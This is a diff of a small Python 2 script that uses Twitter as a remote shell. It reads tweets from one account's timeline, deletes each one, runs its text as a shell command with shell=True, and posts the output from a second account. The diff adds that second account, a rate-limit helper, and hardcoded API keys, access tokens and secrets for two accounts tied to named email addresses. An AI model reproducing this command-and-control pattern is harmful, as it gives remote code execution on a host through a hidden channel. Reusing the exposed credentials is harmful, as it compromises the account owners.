@@ -4,45 +4,61 @@ import subprocess
 import os
 from time import sleep
 
-
+#lbwbchigh@yahoo.com 
 consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
 consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
 access_token = '4827323871-Oig9GWZc6gkVUYK7oTkQO1O4dmoJLuCaY8vE6Dh'
 access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'
-
 auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
 auth.set_access_token(access_token, access_token_secret )
 api = tweepy.API(auth)
+
+#krazykatphoenix@yahoo.com
+consumer_key = 'CEkMw02DlRrM7iFdsadhuAGWz'
+consumer_secret = 'A3VVGro2sy2A0SSYLx3hD1Q4IFpa0lsobUKQ0HyAN5z6FZMf1X'
+access_token = '701149655468527616-CznesGkPJEqyHGjtJTauqKPtUH9O2XJ'
+access_token_secret = 'H4u8EiOe5THE8lPt51Oy4AxLyoleTpugEXIDqRbnRT5Ac'
+auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
+auth.set_access_token(access_token, access_token_secret )
+apiTwo = tweepy.API(auth)
 
 
 
  
 
-count = 0
+
+
+
+def limit():
+	data = api.rate_limit_status()
+	value = str(data['resources']['statuses']['/statuses/home_timeline'])
+	almost = value[-3:]
+	remain= almost[:2]
+	print str(remain) + " API calls remaining" 
+	if( int(remain) == 0):
+		print "Sleeping for 15 minutes. Maually delete tweets from Twitter page."
+		sleep(15*61)
 
 
 def listen():
-	global count
+	
 	public_tweets = None
 	while(not public_tweets):
 		public_tweets = api.home_timeline()
-		count = count +1
+		limit()
+		
 		if public_tweets:
 			for tweet in public_tweets:
 				test = str(tweet.text)			
-				api.destroy_status(tweet.id)
-				if test == '/Users/Luke/Desktop/':
-					api.update_status("Directory changed." ) 
-					os.chdir(test)
-				else:	
-					response = subprocess.check_output(test, shell=True)
+				api.destroy_status(tweet.id)	
+				response = subprocess.check_output(test, shell=True)
 				#if response != "" and repsonse != '/Users/Luke/Desktop/':
-					api.update_status(response)
-					print response
+				apiTwo.update_status(response)
+				print response
 				#else:
 					#api.update_status("Directory changed." ) 
 					#os.chdir(test)	
-				sleep(5)
+				#sleep(5)
 				break
 				#sleep(3)
 			#if count == 9:
